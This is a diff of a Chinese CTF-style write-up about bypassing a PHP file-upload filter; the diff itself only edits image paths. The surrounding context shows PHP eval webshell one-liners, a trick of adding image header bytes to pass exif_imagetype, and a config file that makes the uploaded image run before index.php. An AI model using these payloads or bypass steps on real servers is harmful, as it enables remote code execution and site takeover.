@@ -17,17 +17,17 @@ Date: 2020-12-19
 
    `<?php @eval($_POST('pass'))?>`
 
-   <img src="/images/image-20201223145657037.png" alt="image-20201223145657037" style="zoom:33%;" />
+   <img src="./images/image-20201223145657037.png" alt="image-20201223145657037" style="zoom:33%;" />
 
 3. 然后将后缀改为.jpg后再上传，结果如下，检测出<?，说明后端对上传文件有所检查，如果有<?则不允许上传。
 
-   <img src="/images/image-20201223145956261.png" alt="image-20201223145956261" style="zoom:33%;" />
+   <img src="./images/image-20201223145956261.png" alt="image-20201223145956261" style="zoom:33%;" />
 
    因此可考虑换其他木马。
 
    `<script language="php">eval($_POST['a']);</script>`
 
-   <img src="/images/image-20201223150237140.png" alt="image-20201223150237140" style="zoom:33%;" />
+   <img src="./images/image-20201223150237140.png" alt="image-20201223150237140" style="zoom:33%;" />
 
 4. 此时又显示exif_imagetype:not image!
 
@@ -41,7 +41,7 @@ Date: 2020-12-19
 
    因此，在上传的木马最前面加上以上字节即可。
 
-   <img src="/images/image-20201223151136107.png" alt="image-20201223151136107" style="zoom:33%;" />
+   <img src="./images/image-20201223151136107.png" alt="image-20201223151136107" style="zoom:33%;" />
 
 5. 到此步，已经可以成功上传带有木马的jpg文件，但jpg文件并不能直接执行，因此要想办法能让a.jpg以某种方式执行，然后我们就可以用御剑进行连接。
 
@@ -54,7 +54,7 @@ Date: 2020-12-19
 
    该文件的含义是当访问同文件下的任何一个文件时，都会包含a.jpg文件。
 
-   <img src="/images/image-20201223152036109.png" alt="image-20201223152036109" style="zoom:50%;" />
+   <img src="./images/image-20201223152036109.png" alt="image-20201223152036109" style="zoom:50%;" />
 
    根据显示的结果，可以看到该目录下同样还有index.php，因此此时在访问index.php文件时，默认会在index.php文件的前面加上a.jpg的内容，即可利用御剑进行连接。
 
